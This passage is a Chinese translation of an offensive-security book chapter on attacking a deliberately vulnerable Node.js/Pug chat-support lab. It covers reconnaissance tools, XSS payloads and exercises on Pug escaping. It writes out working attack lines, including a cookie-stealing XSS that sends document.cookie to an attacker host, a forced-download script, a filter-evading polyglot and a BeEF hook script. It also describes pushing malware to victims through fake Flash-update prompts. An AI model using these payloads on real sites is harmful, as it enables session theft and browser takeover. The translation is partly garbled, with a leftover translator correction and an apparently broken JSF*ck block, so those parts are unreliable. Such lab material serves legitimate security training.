  \ OWASP Top 10 是至关重要的。您不仅要知道它们是什么，还应对每一种都具备优秀的示例，说明其带来的风险类型以及如何进行检查。现在，让我们回到攻破 CSK\
  \ 的话题上。\n\n### 聊天支持系统实验室\n\n即将受到攻击的聊天支持系统实验室旨在实现交互性，并突出新旧各类漏洞。正如您将看到的那样，对于后续的许多实验室，我们都会提供一个包含聊天支持系统特定版本的定制虚拟机。\n\
  \n该应用程序本身是用 Node.js 编写的。为什么选择 Node.js？作为渗透测试人员，我们会看到它是增长最快的应用程序之一。由于许多开发者和 Node.js\
  \ 关系匪浅，我觉得您理解作为后端代码运行 JavaScript 的安全影响非常重要。\n\n#### 什么是 Node.js？\n\n\"Node.js® 是基于\
  \ Chrome 的 V8 JavaScript 引擎构建的 JavaScript 运行时。Node.js 使用事件驱动的非阻塞 I/O 模型，使其轻量且高效。”[`https://nodejs.org/en/`](https://nodejs.org/en/)\
  \ Node.js 的包生态系统 NPM（Node Package Manager）是世界上最大的开源库生态系统。\n\n在非常基础层面上，Node.js 允许您在浏览器之外运行\
  \ JavaScript。由于 Node.js 具有轻量、快速和跨平台的特点，它可以极大地通过统一技术栈来简化项目。虽然 Node.js 本身不是 Web 服务器，但它允许服务器（一种您可以用\
  \ JavaScript 编程的环境）存在于实际 Web 客户端之外的环境中。\n\n优点：\n\n*   速度极快\n*   单线程 JavaScript 环境，能够充当独立的\
  \ Web 应用服务器\n*   Node.js 不是一项协议；它是一个用 JavaScript 编写的 Web 服务器\n*   NPM 注册表托管着近 50\
  \ 万个免费的、可重用的 Node.js 包，使其成为世界上最大的软件注册表\n\n在过去几年中，随着 Node.js 变得如此流行，对于渗透测试人员/红队人员来说，理解需要寻找什么以及如何攻击这些应用程序非常重要。例如，一名研究员发现薄弱的\
  \ NPM 凭据使他能够获得 13% 的 NPM 包的编辑/发布权限。通过依赖链，估计有 52% 的 NPM 包可能受到漏洞影响。[`https://www.bleepingcomputer.com/news/security/52-percent-of-all-javascript-npm-packages-could-have-been-hacked-via-weak-credentials/`](https://www.bleepingcomputer.com/news/security/52-percent-of-all-javascript-npm-packages-could-have-been-hacked-via-weak-credentials/)\n\
  \n在接下来的例子中，我们的实验室将以 Node.js 作为应用程序的基础，并利用 Express 框架（[`https://expressjs.com/`](https://expressjs.com/)）作为我们的\
  \ Web 服务器。随后，我们将 Pug（[`https://pugjs.org/`](https://pugjs.org/)）模板引擎添加到我们的 Express\
  \ 框架中。这与我们现在在新开发的应用中常见的做法类似。\n\n![](img/00035.jpeg)![](img/00036.jpeg)\n\nExpress\
  \ 是一个用于 Node.js 的最小化 Web 框架。Express 为 Web 和移动应用程序提供了一组强大的功能，因此您无需进行大量工作。通过使用名为 Middlewares\
  \ 的模块，您可以添加第三方身份验证或类似 Facebook Auth 或 Stripe 支付处理的服务。\n\nPug（以前称为 Jade）是一个服务器端模板引擎，您可以（但不必须）与\
  \ Express 一起使用。Jade 用于在服务器上程序化生成 HTML 并将其发送到客户端。\n\n让我们攻击 CSK 并启动聊天支持系统虚拟机。\n\n\
  ## 网络空间猫咪：聊天支持系统\n\n您无意中撞见了面向外部的“网络空间猫咪”聊天支持系统。当您慢慢浏览所有页面并了解底层系统时，请寻找应用程序中的弱点。您需要找到进入服务器的第一个入口点，以便能够转向生产环境。\n\
  \n您首先运行了所有漏洞扫描器和 Web 应用扫描器的报告，但一无所获。看来该公司 regularly（定期）运行常见的漏洞扫描器，并已修补了其大多数问题。现有的“金蛋”发现结果现在依赖于编码问题、配置错误和逻辑缺陷。您还注意到该应用程序正在运行\
  \ NodeJS，这是一种近期流行的语言。\n\n### 设置您的 Web 应用黑客机器\n\n虽然对于攻击 Web 应用程序没有完美的配方，但您需要的一些基本工具包括：\n\
  \n*   武装自己的浏览器。许多浏览器在复杂 XSS 逃避方面的表现大相径庭：\n\n    *   Firefox（我进行测试的首选）\n    *   Chrome\n\
  \    *   Safari\n\n*   Wappalyzer：一款跨平台实用程序，可 uncover（揭示）网站上使用的技术。它能检测内容管理系统、电子商务平台、Web\
  \ 框架、服务器软件、分析工具等。[`https://wappalyzer.com/`](https://wappalyzer.com/)\n\n    * \
  \  Wappalyzer\n    *   https://wappalyzer.com/\n*   BuiltWith：网站配置文件工具。查阅某一页面时，BuiltWith\
  \ 会返回该页面上可发现的所有技术。BuiltWith 的目标是帮助开发者、研究人员和设计师了解页面使用的技术，这可能会帮助他们决定要自行实施哪些技术。\n\n\
  \    *   BuiltWith\n    *   https://builtwith.com/\n*   Retire.JS：扫描 Web 应用以查找是否有使用易受攻击的\
  \ JavaScript 库。Retire.js 的目标是帮助您检测已知漏洞版本的使用情况。\n\n    *   Retire.js\n    *   https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?hl=en\n\
  *   Burp Suite（约$350）：虽然这款商业工具价格有点贵，但它绝对是物超所值的，也是渗透测试人员/红队人员的必备工具。其优势来自附加组件、模块化设计和用户开发基础。如果您买不起\
  \ Burp，OWASP ZAP（免费）是一个极佳的替代品。\n\n### 分析 Web 应用程序\n\n在我们进行任何类型的扫描之前，重要的是尝试理解底层代码和基础设施。如何知道正在运行后端的是什么呢？我们可以使用\
  \ Wappalyzer、BuiltWith，或者只使用 Google Chrome 的开发者工具检查。在下方的图片中，加载聊天应用程序时，我们可以看到 HTTP\
  \ 标头中包含\"X-Powered By: Express\"。我们还可以看到 Wappalyzer 表明该应用程序正在使用 Express 和 Node.js。\n\
  \n![](img/00037.jpeg)![](img/00038.jpeg)\n\n在盲目攻击站点之前理解应用程序可以帮助您提供更佳的方案。此外，这也有助于针对可能配备\
  \ WAF（Web 应用防火墙）的站点，让您能够执行更隐秘的“忍者式”攻击。\n\n### Web 发现\n\n在之前的书籍中，我们更深入地讲解了如何使用 Burp\
  \ Suite 以及如何对站点进行渗透测试。我们将略过许多设置基础知识，更多地集中在攻击站点本身。\n\n在此时此刻，我们将假设您已经配置好了 Burp Suite（免费或付费版），并且您正在使用\
  \ THP Kali 镜像。一旦我们了解了底层系统，我们就需要识别所有端点。我们需要像以前一样运行相同的发现工具。\n\n*   Burp Suite（[`https://portswigger.net/burp`](https://portswigger.net/burp)）\n\
  \n    *   Spidering（自动爬虫）：在免费和付费版本中，Burp Suite 都拥有一套优秀的爬虫工具。\n\n\n\n\n\n    *  \
  \ 内容发现：如果您使用 Burp Suite 的付费版本，在 `Engagement` ( engagements) 工具下的一个最受欢迎的内容发现工具是 `Discover\
  \ Content`。这是一个智能且高效的内容发现工具，用于查找目录和文件。您可以为扫描指定几种不同的配置。\n\n    *   Active Scan（主动扫描）：对所有参数运行自动漏洞扫描，并测试多种\
  \ Web 漏洞。\n\n*   `OWASP ZAP` (`http://bit.ly/2IVNaO2`) \n\n    *   与 Burp 类似，但完全是开源免费的。具有类似的发现和主动扫描功能。\n\
  \n*   `Dirbuster`\n\n    *   这是一个已经存在多年的旧工具，用于发现 Web 应用程序的文件和文件夹，但它仍然能完成这项工作。\n\n\
  \    *   目标 URL：`http://chat:3000`\n\n    *   单词列表 (Word List)：\n\n        *   `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`\n\
  \n*   `GoBuster` (`https://github.com/OJ/gobuster`) \n\n    *   Very lightweight,\
  \ fast directory and subdomain bruteforce tool（非常轻量、快速的目录和子域名暴力破解工具）-> 更正翻译：非常轻量且快速的目录与子目录/子域名字典爆破工具\n\
  \n    *   `gobuster -u http://chat:3000 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt\
  \ -s 200,301,307 -t 20`\n\n您的单词列表非常重要。我最喜欢的一个旧单词列表称为 `raft`，它是许多开源项目的集合。您可以在此处找到这些以及其他有价值的单词列表：`https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content`（这\
  \ already included in your `THP Kali` image 中已包含）。\n\n现在我们已经完成了概述部分，让我们进入一些攻击内容。从红队角度来看，我们正在寻找可以主动攻击且性价比最高的漏洞。如果我们正在进行审计或渗透测试，我们可能会报告诸如\
  \ SSL 问题、默认的 Apache 页面或非可利用的来自`vulnerability scanner`(漏洞扫描器)发现的漏洞等问题。但是，在我们的红队任务中，我们可以完全忽略这些问题，专注于能够获得高级访问权限、Shell\
  \ 会话或泄露 `PII\"(个人隐私信息)\"攻击”。\n\n### 跨站脚本 (XSS)\n\n到目前为止，我们已经见识并处理过 `Cross-Site Scripting`\
  \ (`XSS`)。使用传统的 `XSS` 攻击 `<script>alert(1)</script>`来测试网站上的每个变量对于漏洞赏金项目来说可能很出色，但我们能做得更多吗？我们可以使用哪些工具和方法更好地利用这些攻击？\n\
  \n因此，我们都知道 `XSS` 攻击是客户端攻击，允许攻击者构建特定的 Web 请求以注入恶意代码到响应中。这通常可以通过正确实施客户端和服务器端的输入验证来修复，但绝不那么简单。为什么会这样呢？您问为什么？这是由多种原因造成的。从编码质量差、对框架缺乏理解，有时应用程序过于复杂以至于难以理解输入的去向等各个方面。\n\
  \n由于警报框实际上不会造成任何真正的伤害，让我们先从一些基本的`XSS`攻击类型开始：\n\n*   Cookie 窃取 `XSS`：<script>document.write('<img\
  \ src=\"http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '\" />');</script>\n\
  *   强制下载文件: `<script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';\
  \ link.download = ''; document.body.appendChild(link); link.click();</script>`\n\
  *   重定向用户：<script>window.location = \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"\
  ;</script>\n*   其他脚本：用于启用键盘记录器、截取照片等功能\n\n    *   `http://www.xss-payloads.com/payloads-list.html?c#category=capture`\n\
  \n#### 混淆/多态 XSS 载荷 (Obfuscated/Polyglot XSS Payloads)\n\n在当今世界，标准的`XSS`负载均衡（payload）仍然经常有效，但我们确实会遇到一些会阻止某些字符的应用程序或在该应用程序前面部署\
  \ `WAF`(Web Application Firewall, Web 应用防火墙)。两个很好的资源可帮助您开始构建`obfuscated`(混淆的)`XSS`负载攻击：\n\
  \n*   `https://github.com/foospidy/payloads/tree/master/other/xss`\n*   `https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`\n\
  \n有时在评估期间，您可能会遇到简单的`XSS`过滤器，它们查找类似 `<script>` 的字符串。混淆`XSS`负载是一种选择，但也值得注意并非所有 `JavaScript`载荷都需要公开和关闭的`<script>标记`\
  \ 。有一些 `HTML Event Attributes`(HTML 事件属性),这些属性在被触发时会执行 JavaScript(https://www.w3schools.com/tags/ref_eventattributes.asp)。这意味着任何专门查找脚本标签的规则都将无用。例如，以下位于\
  \ `<script>` 标签之外的、用于执行 JavaScript 的 HTML 事件：\n\n*   `<b onmouseover=alert('XSS')>Click\
  \ Me!</b>`\n*   `<svg onload=alert(1)>`\n*   `<body onload=\"alert('XSS')\">`\n\
  *   `<img src=\"http://test.cyberspacekittens.com\" onerror=alert(document.cookie);>`\n\
  \n您可以在 CSK 应用程序上尝试这些每一种 `HTML`实体攻击，方法是进入该应用程序: `http://chat:3000/`(请记住修改您的 `/etc/host`文件以使`chat`指向您的\
  \ VM IP)。一旦您在那裡，注册一个帐户并登录到该应用程序，然后前往 `聊天(chat)` 功能 (`http://chat:3000/chatchannel/1`)\
  \ 。尝试不同的实体验攻击和混淆载荷。\n\n![](img/00039.jpeg)\n\n其他关于`XSS`的优秀资源：\n\n*   第一个是@jackmasa\
  \ 制作的思维导图 `Mind Map`。这是一个极好的文档，根据不同位置提供的输入来分解各种 XSS 负载（虽然不再出现在 JackMasa GitHub 页面），但副本可以在这里找到:\
  \ `http://bit.ly/2qvnLEq` 。\n*  另一个优秀的资源讨论了哪些浏览器易受哪种 `XSS`载荷的攻击：https://html5sec.org/。\n\
  \n![](img/00040.jpeg)\n\nJackMasa XSS Mind Map (思维导图）\n\n如您所见，试图找到应用程序上的每一个`XSS`可能会很烦人。这是因为受影响的是具有不同代码功能、不同类型的\
  \ HTML 标签、不同类型的应用程序以及不同类型的过滤器的漏洞参数。尝试找到初步的 `XSS`弹出窗口可能需要很长时间。如果我们能尝试将多个载荷链接到单个请求中怎么办？\n\
  \n这种最后一种类型的负载称为 `Polyglot`(多态/聚合)。一个`Polyglot`加载器采用许多不同类型的载荷/混淆技术，并将它们编译成一个攻击。这对于查找\
  \ XSS 的自动化脚本、时间有限的漏洞赏金猎人来说非常棒，或者只需快速找到输入验证问题的方法就是这样简单。\n\n因此，不同于正常的 `<script>alert(1)</script>`\
  \ ，我们可以像这样（http://bit.ly/2GXxqxH ）构建一个多态 Polyglot：\n\n*   `/*-/\\` /*'/\"**/( \\\
  */ oNcliCk=alert() )//%0D %0A % 0d%0a // </stYle /</titLe /</teXtarEa /</scRipt/--!\\\
  >\\\\x3csVg/<sVg/oNloAd=alert ()>//>\\x3e`\n\n如果您查看上面的载荷，攻击者试图跳出注释、引号和斜杠；执行 onclick\
  \ `XSS` ；关闭多个标签；最后尝试 onload XSS。这类攻击使 Polyglots（多态）在识别 XSS 方面极其有效和高效。您可以在此处了解更多关于这些\
  \ Polylgott Xen 的内容: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot\n\
  \n如果您想测试并尝试不同的 `polyglots`，您可以在易受攻击的 `XSS`页面 (`http://chat:3000/xss`) 或整个聊天应用程序中从此处开始。\n\
  \n#### BeEF（浏览器利用框架）\n\n**Browser Exploitation Framework**(`http://beefproject.com/`)或\
  \ **BeEF**将 XSS 提升到了另一个水平。该工具向受害者的浏览器注入 `JavaScript`负载，从而感染用户的系统。这会在受害者浏览器上创建一个用于\
  \ JavaScript 后渗透的 C2(C&C, Command and Control)渠道。\n\n从红队的角度来看，BeEF 是攻击活动中非常棒的工具，可用于追踪用户、捕获凭据、执行\
  \ clickjacking（点击劫持）、利用 tabnapping (标签页窃取）等功能。如果不在攻击期间使用它，则 Beef 是一个非常棒的工具，可以展示\
  \ XSS 漏洞的威力。这也可以协助进行更复杂的攻击，我们将在本书后面的 `Blind XSS`(盲注/隐式 XSS)部分进行讨论）。\n\n**BeEF**分为两部分：一个是服务器，另一个是攻击载荷。要启动服务器：\n\
  \n在您的攻击者 Kali Host(主机)上运行 BeEF（Server）\n\n    *   从`Terminal`(终端):\n        *  \
  \ `beef-xss`\n        *   使用 **beef:beef**进行身份验证\n        *   查看 http://127.0.0.1:3000/hook.js\n\
  \n\n*   完整负载挂钩文件：\n\n    *   `<script src=\"http://<Your IP>:3000/hook.js\"></script>`\n\
  \n查看位于`http://127.0.0.1:3000/hook.js`上的`hook.js` 文件，您应该会看到类似长混淆的 JavaScript 文件。这就是将受害者连接回命令控制服务器的客户端负载。\n\
  \n一旦您确定了目标应用程序上的 XSS 漏洞，与其使用原始`alert(1)` 风格的负载，您会修改 `<script src=\"http://<Your\
  \ IP>:3000/hook.js\"></script>` 负载以利用该漏洞。一旦受害者陷入此 XSS 陷阱，这会导致其浏览器连接回您并成为僵尸网络的一部分。\n\
  \nBeEF 支持哪些类型的后渗透攻击？一旦受害者受控，您实际上可以做 JavaScript 所能做的任何事情。您可以通过 HTML5 启动他们的摄像头并拍摄受害者的照片，您可以在屏幕上推送叠加层以捕获凭据，或者可以将他们重定向到恶意网站以执行恶意软件。\n\
  \n以下是关于 BeEF 能够从 XSS 攻击中引起巨大问题的快速演示：\n\n首先，请确保您的 BeEF 服务器在您的攻击者机器上运行。在我们的易受攻击的 Chat\
  \ Support System 应用程序上，您可以前往`http://chat:3000/xss`，在 Exercise 2 字段中输入您的负载：\n\n*\
  \   `<script src=\"http://127.0.0.1:3000/hook.js\"></script>`\n\n一旦受害者连接到您的僵尸网络，您就完全控制了他们的浏览器。您可以根据其设备、浏览器和启用的功能执行各种攻击。使用社会工程学策略展示\
  \ XSS 影响的绝佳方法是通过 Flash 更新提示向其计算机推送恶意软件。\n\n![](img/00041.jpeg)\n\n执行后，受害者的计算机上会出现弹窗，迫使其安装更新，其中将包含额外的恶意软件。\n\
  \n![](img/00042.jpeg)\n\n我建议花时间探索所有的 BeEF 后渗透模块并理解 JavaScript 的强大功能。既然我们控制浏览器，我们必须找出如何在红队行动中利用这一点。一旦从\
  \ XSS 感染了受害者，您还想做什么？我们将在 XSS 到入侵部分讨论这一点。\n\n### 盲 XSS\n\n盲 XSS 很少被讨论，因为这是耐心者的游戏。什么是盲\
  \ XSS？正如攻击名称所示，当执行存储的 XSS 负载对攻击者/用户不可见，但对管理员或后端员工可见时，就是盲 XSS。虽然这种攻击由于能够攻击后端用户而可能造成严重危害，但往往被忽视。\n\
  \n例如，假设应用程序有一个“联系我们”页面，允许用户向管理员提供联系信息以便日后联系。由于该数据的结果仅可由管理员手动查看，而请求用户无法查看，如果应用程序易受\
  \ XSS 攻击，那么攻击者不会立即看到他们的\"alert(1)\"攻击。在这种情况下，我们可以使用 XSSHunter (`https://xsshunter.com`)\
  \ 帮助我们验证盲 XSS。\n\nXSSHunter 的工作原理是，当我们的 JavaScript 负载执行时，它会拍摄受害者屏幕（当前查看的页面）的截图，并将这些数据发送回\
  \ XSSHunter 的网站。当这种情况发生时，XSSHunter 将发送警报，告知我们的负载已执行并提供所有详细信息。我们现在可以回去创建一个非常恶意的负载并重新进行我们的攻击。\n\
  \nXSS Hunter：\n\n*   禁用任何代理（即 `Burp Suite`）\n*   在 `https://xsshunter.com` 创建账户\n\
  *   在 `https://xsshunter.com/app` 登录\n*   前往负载获取您的负载\n*   修改负载以适配您的攻击或构建混合负载\n*\
  \   检查 XSS Hunter 以查看负载执行\n\n![](img/00043.jpeg)\n\n![](img/00044.jpeg)\n\n### 基于\
  \ DOM 的 XSS\n\n反射性和存储 XSS 的理解相对简单。正如我们所知，服务器没有对用户提供充分的输入/输出验证，我们的恶意脚本代码会在源代码中呈现给用户。然而，在基于\
  \ DOM 的 XSS 中，情况略有不同，这导致了许多常见的误解。因此，让我们花时间专注于基于 DOM 的 XSS。\n\n文档对象模型 (DOM) 基于的 XSS\
  \ 成为可能，是因为攻击者可以操纵 Web 应用程序的客户端脚本。如果攻击者可以将恶意代码注入 DOM 并由客户端浏览器读取，则当从 DOM 中读取数据时，负载将被执行。\n\
  \nDOM 到底是什么？文档对象模型 (DOM) 是 HTML 属性的表示。由于您的浏览器不理解 HTML，它使用解释器将 HTML 转换为称为 DOM 的模型。\n\
  \n让我们在 Chat Support Site 上了解这一点。查看易受攻击的 Web 应用程序，您应该能够看到聊天网站易受 XSS 攻击：\n\n*   创建账户\n\
  *   登录\n*   前往聊天\n*   尝试 `<script>alert(1)</script>` 然后尝试一些疯狂的 XSS 攻击！\n\n在我们的示例中，Node.js\
  \ 在服务器端运行，`socket.io`（Node.js 库）在用户和服务器之间设置 Web 套接字，客户端 JavaScript 和我们的恶意 `msg.msgText`\
  \ JavaScript。正如您在下图和页面的源代码中看到的，您不会像标准反射性/存储 XSS 那样直接看到\"alert\"负载的引用。在这种情况下，我们收到的唯一表明我们的负载可能在哪里执行的参考是来自\
  \ `msg.name` 的引用。这有时使得我们难以确定在哪里执行我们的 XSS 负载，或者是否有任何 HTML 标签需要跳出。\n\n![](img/00045.jpeg)\n\
  \n### NodeJS 中的高级 XSS\n\nXSS 一直回归的一个主要原因是因为它比仅仅过滤标签或特定字符要困难得多。当负载特定于某种语言或框架时，XSS\
  \ 变得非常难以防御。由于每种语言在漏洞方面都有奇特性，NodeJS 也不例外。\n\n在高级 XSS 部分，您将浏览几个示例，其中语言特定的 XSS 漏洞发挥作用。我们的\
  \ NodeJS Web 应用程序将使用更常见的 Web 堆栈和配置。此实现包括 Express 框架 (`https://expressjs.com/`) 和\
  \ Pug 模板引擎 (`https://pugjs.org/`)。重要的是要注意，默认情况下，Express 没有内置的 XSS 防护，除非通过模板引擎进行渲染。当使用如\
  \ Pug 之类的模板引擎时，有找到 XSS 漏洞的两种常见方式：(1) 通过字符串插值，(2) 缓冲代码。\n\n模板引擎有一个字符串插值的概念，即是一种花哨的说法，即“字符串变量的占位符”。例如，让我们在\
  \ Pug 模板格式中为变量分配字符串：\n\n*   `- var title = \"This is the HTML Title\"`\n*   `- var\
  \ THP = \"Hack the Planet\"`\n*   `h1 #{title}`\n*   `p The Hacker Playbook will\
  \ teach you how to #{THP}`\n\n注意 `#{THP}` 是指分配给 THP 的变量的占位符。我们通常在电子邮件分发消息中看到这些模板。您是否曾收到来自自动系统的电子邮件，其中有\
  \ `Dear ${first_name}`……而不是您实际的第一个名字？这正是模板引擎的用途。\n\n当上面的模板代码渲染为 HTML 时，它将看起来像：\n\
  \n*   `<h1>This is the HTML Title</h1>`\n*   `<p>The Hacker Playbook will teach\
  \ you how to Hack the Planet</p>`\n\n幸运的是，在这个案例中，我们使用的是 `\"#{THP}\"` 字符串插值，即 Pug\
  \ 插值的转义版本。正如您所见，通过使用模板，我们可以创建非常可重用的代码并使模板非常轻量。\n\n\n\n\n\n`Pug` 同时支持转义和非转义字符串插值。转义与非转义插值的区别是什么？嗯，使用转义字符串插值会对\
  \ `<`、`>`、`'` 和 `\"` 等字符进行 HTML 编码。这将有助于向用户提供输入验证反馈。如果开发人员使用非转义字符串插值，通常会导致 XSS 漏洞。\n\
  \n此外，字符串插值（也可称为变量插值、变量替换或变量扩展）是指评估包含一个或多个占位符的字符串字面量，并生成将这些占位符替换为相应值的结果的过程。[https://en.wikipedia.org/wiki/String_interpolation]\n\
  \n*   在 `Pug` 中，转义与非转义字符串插值（[https://pugjs.org/language/interpolation.html]）：\n\n\
  \    *   `!{}` – 非转义字符串插值\n\n    *   `#{}` – 转义字符串插值 *虽然这是转义的，但如果直接通过 JavaScript\
  \ 传递，仍可能易受 XSS 攻击*\n\n*   在 `JavaScript` 中，未转义的缓冲代码以 `\"!=\"` 开头。`\"!=\"` 之后的任何内容都将自动作为\
  \ `JavaScript` 执行。[https://pugjs.org/language/code.html#unescaped-buffered-code]\n\
  \n*   最后，任何时候允许插入原始 `HTML`，都存在 `XSS` 的潜在风险。\n\n在现实生活中，我们看到许多基于上述记法的案例易受 `XSS` 攻击，原因是开发人员忘记了当前所处的上下文以及输入的来源。让我们看看几个涉及我们易受攻击的\
  \ `Chat Support System` 应用程序的示例。请访问 `VM` 上的以下 `URL`：`http://chat:3000/xss`。我们将逐一讲解这些练习，帮助您理解\
  \ `NodeJS`/`Pug` `XSS`。\n\n#### `Exercise 1` ([http://chat:3000/xss])\n\n在这个示例中，我们将转义字符串插值插入到\
  \ `paragraph` 标签中。这是不可 exploited 的，因为我们在 `HTML` `paragraph` 上下文中使用了正确的转义字符串插值记法。\n\
  \n*   前往 `http://chat:3000/xss` 并点击 `Exercise` #1\n\n*   `Pug` 模板源代码：\n\n    * \
  \  `p No results found for #{name1}`\n\n*   尝试输入并提交以下载荷：\n\n    *   `<script>alert(1)</script>`\n\
  \n*   点击返回到 `Exercise` #1 并查看 `No Results Output`（无结果输出）\n\n*   查看 `HTML Response`（查看页面源代码）：\n\
  \n    *   `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`\n\n![](img/00046.jpeg)\n\
  \n点击 `submit` 后，查看页面源代码（按 `ctrl+u`）并搜索单词 `\"alert\"`。您将看到我们载荷中的特殊字符被转换为 `HTML` 实体。虽然\
  \ `script` 标签在我们的网站中仍然可见，但它们不会被渲染为 `JavaScript`。这种字符串插值的使用方式是正确的，真的没有办法脱离此场景来发现\
  \ `XSS`。这里的处理堪称完美！让我们来看看一些糟糕的实现。\n\n#### `Exercise 2`\n\n在这个示例中，`paragraph` 标签中使用了由\
  \ `!{}` 表示的非转义字符串插值。这在设计上就易受 `XSS` 攻击。任何基本的 `XSS` 载荷都会触发此问题，例如：\\`<script>alert(1)</script>\\\
  `\n\n*   前往 `Exercise` #2\n\n*   `Pug` 模板源代码：\n\n    *   `p No results found for\
  \ !{name2}`\n\n*   尝试输入以下载荷：\n\n    *   `<script>alert(1)</script>`\n\n*   响应：\n\
  \n    *   `<script>alert(1)</script>`\n\n*   点击 `submit` 后，我们应该能看到弹出的提示框。您可以通过查看页面源代码并搜索\
  \ `\"alert\"` 来验证这一点。\n\n因此，在提交用户输入的地方使用非转义字符串插值（`!{name2}`）会带来很多麻烦。这是一种糟糕的编程实践，绝不应用于用户提交的数据。我们输入的任意\
  \ `JavaScript` 都将在受害者的浏览器上执行。\n\n![](img/00047.jpeg)\n\n#### `Exercise 3`\n\n在这个示例中，我们在动态内联\
  \ `JavaScript` 中使用了转义字符串插值。这意味着我们是受到保护的，因为它被转义了，对吧？并非完全如此。此示例易受攻击是因为我们要处于代码上下文中。我们会发现在\
  \ `Pug` 模板中，在我们转义的插值之前，我们实际上已经位于 `script` 标签内部了。因此，任何 `JavaScript` 即使被转义，也会自动执行。更好的一点是，因为我们在\
  \ `Script` 标签中，所以不需要将 `<script>` 标签作为载荷的一部分。我们可以直接使用 `JavaScript`，例如：`alert(1)`：\n\
  \n*   前往 `Example` #3\n\n*   `Pug` 模板源代码：\n\n    *   `script.`\n        *   `var\
  \ user3 = #{name3};`\n        *   `p No results found for #{name3}`\n\n*   此模板翻译后的\
  \ `HTML` 如下：\n\n    *   `<script>`\n    *   `<p>No results found for [escaped user\
  \ input]</p>`\n    *   `</script>`\n\n*   尝试输入以下载荷：\n\n    *   `1;alert(1);`\n\n\
  *   点击 `submit` 后，我们应该能看到弹出的提示框。您可以通过查看页面源代码并搜索 `\"alert\"` 来验证这一点。\n\n虽然只是微小的变化，但正确的写法应该是给插值加上引号：\n\
  \n*   `Pug` 模板源代码：\n\n    *   `script.`\n        *   `var user3=\"#{name3}\"`\n\n\
  #### `Exercise 4`\n\n在这个示例中，我们有 `Pug` 未转义的缓冲代码（[https://pugjs.org/language/code.html]），由\
  \ `!=` 表示，这由于没有转义而在设计上易受 `XSS` 攻击。因此，在这个场景中，我们可以使用简单的 `\"<script>alert(1)</script>\"\
  ` 风格的攻击针对输入字段。\n\n*   `Pug` 模板源代码：\n\n    *   `p != 'No results found for '+name4`\n\
  \n*   尝试输入以下载荷：\n\n    *   `<script>alert(1)</script>`\n\n*   点击 `submit` 后，我们应该能看到弹出的提示框。您可以通过查看页面源代码并搜索\
  \ `\"alert\"` 来验证这一点。\n\n#### `Exercise 5`\n\n假设我们遇到了一个同时使用转义字符串插值和某种过滤类型的应用程序。在我们要进行的下一个练习中，在\
  \ `NodeJS` 服务器中执行了最小的黑名单过滤脚本，该脚本会删除诸如 `<`、`>` 和 `\"alert\"` 等字符。但是，他们再次犯了一个错误，将转义字符串插值放在了\
  \ `script` 标签内。如果我们能把 `JavaScript` 放进去，就可能造成 `XSS`：\n\n*   前往 `Example` #5\n\n*\
  \   `Pug` 模板源代码：\n\n    *   `name5 = req.query.name5.replace(/[;'\"<>=]|alert/g,\"\
  \")`\n    *   `script.`\n        *   `var user3 = #{name5};`\n\n*   尝试输入以下载荷：\n\n\
  \    *   您可以尝试输入 `alert(1)`，但由于过滤器而不奏效。您也可以尝试诸如 `<script>alert(1)</script>` 之类的内容，但转义代码和过滤器会将我们拦下。如果我们真的想要插入\
  \ `alert(1)` 载荷，该怎么做呢？\n\n*   我们需要找出如何绕过滤波器以插入原始 `JavaScript`。请记住，`JavaScript` 功能极其强大，拥有大量功能。我们可以滥用这些功能来创建一些富有创意的载荷。绕过这些过滤器的一种方法是利用\
  \ esoteric（冷僻/奇特）的 `JavaScript` 语法。这可以通过一个名为 `http://www.jsfuck.com/` 的网站创建。如下所示，通过使用方括号、括号、加号和感叹号，我们可以重现\
  \ `alert(1)`。\n\n*   `JSF*ck` 载荷：\n\n\n\n\n### XSS 载荷（混淆示例）\n\n```javascript\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])+[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])+![+[]+!+[]+!+[]]+!!!=[]][]](([][[![]+[]][+[][++]++([][[![]+[]][+[]}+[[++]]+[+++]]+++[!(++)])][(+(++[])++(++++++++[])))]\n\
  ```\n\n![](img/00048.jpeg)\n\n正如你所知，许多浏览器已开始集成 XSS 防护。我们甚至曾利用这些载荷绕过某些浏览器防护。请尝试在\
  \ Kali 之外的实际浏览器（如 Chrome）中使用它们。\n\n在复杂应用程序中防止 XSS 并不容易。人们很容易遗漏或误解框架处理输入和输出的方式。因此，在对\
  \ Pug/NodeJS 应用程序进行源代码审查时，搜索源代码中的 `!{`、`{#``` 或 ``${``，有助于识别 XSS 潜在位置。了解上下文以及该上下文是否需要进行转义，至关重要，我们将在以下示例中看到。\n\
  \n尽管这些攻击特定于 Node 和 Pug，但每种语言都面临其自身的 XSS 和输入验证问题。你无法仅通过运行漏洞扫描器或 XSS 模糊测试工具来发现所有的\
  \ XSS 漏洞。你真正需要理解所使用的语言和框架。\n\n### 从 XSS 到系统入侵\n\n我常收到这样的问题：“如何从 XSS 攻击跳转到 Shell\
  \ 攻击？”虽然方法多种多样，但通常如果我们能够在内容管理系统（CMS）或类似系统中实现用户到管理员级别的 XSS 攻击，那么这将导致系统的完全被攻破。关于 Hans-Michael\
  \ Varbaek 提供的完整示例和代码可以在这里找到：https://github.com/Varbaek/xsser。Hans-Michael 提供了一些关于重现从\
  \ XSS 到远程代码执行（RCE）攻击的绝佳示例和视频。\n\n我喜欢利用的一种自定义红队攻击涉及 JavaScript 的特性。我们知道 JavaScript\
  \ 极其强大，我们已经在 BeEF（浏览器利用框架）中看到了这些功能。因此，我们可以利用所有这些功能来对受害者发起攻击而受害者毫不知情。这个载荷会做什么？一个攻击示例是让\
  \ JavaScript XSS 载荷在受害者机器上运行，获取受害者机器内部的（Natted）IP 地址。然后我们可以获取该 IP 地址，并使用我们的载荷扫描其内部网络。如果我们找到一个已知无需身份验证即可被攻破的\
